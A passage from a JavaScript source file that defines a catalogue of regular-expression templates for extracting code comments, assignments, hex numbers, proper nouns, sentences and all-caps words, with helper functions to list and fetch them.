    explanation: 'Matches // comments until end of line.',
    examples: [
      '// TODO: fix this',
      '// Comment line'
    ],
  },

  multiLineComment: {
    id: 'multi-line-comment',
    category: 'Code',
    name: 'Multi-line Comments',
    description: 'Extract /* block comments */',
    pattern: '\\/\\*[\\s\\S]*?\\*\\/',
    flags: 'g',
    explanation: 'Matches /* ... */ including newlines.',
    examples: [
      '/* comment block */',
      '/* multi\nline\ncomment */'
    ],
  },

  assignment: {
    id: 'assignment',
    category: 'Code',
    name: 'Variable Assignments',
    description: 'Extract variable assignments: key = value',
    pattern: '\\b([a-zA-Z_][a-zA-Z0-9_]*)\\s*=\\s*([^;]+)',
    flags: 'g',
    explanation: 'Captures name and value in variable assignments.',
    examples: [
      'count = 42',
      'name = "Alice"',
      'isActive = true'
    ],
  },

  hexNumberBatch7: {
    id: 'hex-number-batch7',
    category: 'Common',
    name: 'Hexadecimal Numbers',
    description: 'Extract hex numbers like 0xFF or FF12AB with minimum length constraints',
    pattern: '0x[A-Fa-f0-9]+\\b|\\b[A-Fa-f0-9]{3,}\\b',
    flags: 'g',
    explanation: 'Matches hex numbers: with 0x prefix (any length) or without prefix (minimum 3 characters) to avoid false positives from short text.',
    examples: [
      '0xFF',
      'A1B2C3'
    ],
  },

  /* Batch 7 - Language */
  properNoun: {
    id: 'proper-noun',
    category: 'Language',
    name: 'Proper Nouns',
    description: 'Extract capitalized words or names',
    pattern: '\\b[A-Z][a-z]+(?:\\s+[A-Z][a-z]+)*\\b',
    flags: 'g',
    explanation: 'Matches names like John Smith or New York.',
    examples: [
      'John Smith',
      'San Francisco'
    ],
  },

  sentenceBatch7: {
    id: 'sentence-batch7',
    category: 'Language',
    name: 'Sentences',
    description: 'Extract full sentences ending in . ! ?',
    pattern: '[A-Z][^.!?]*[.!?]',
    flags: 'g',
    explanation: 'Captures English sentences (simple rule).',
    examples: [
      'This is a test.',
      'Hello world!'
    ],
  },

  allCaps: {
    id: 'all-caps',
    category: 'Language',
    name: 'All-Caps Words',
    description: 'Extract fully capitalized words',
    pattern: '\\b[A-Z]{2,}\\b',
    flags: 'g',
    explanation: 'Matches acronyms or shouting text.',
    examples: [
      'NASA',
      'ERROR',
      'HTTP'
    ],
  },
};

export function getPatternTemplatesByCategory() {
  const categories = {};
  
  Object.values(REGEX_PATTERN_TEMPLATES).forEach(template => {
    if (!categories[template.category]) {
      categories[template.category] = [];
    }
    categories[template.category].push(template);
  });
  
  return categories;
}

export function getPatternTemplate(id) {
  return REGEX_PATTERN_TEMPLATES[id] || null;
}

export function getAllPatternTemplates() {
  return Object.values(REGEX_PATTERN_TEMPLATES);
}
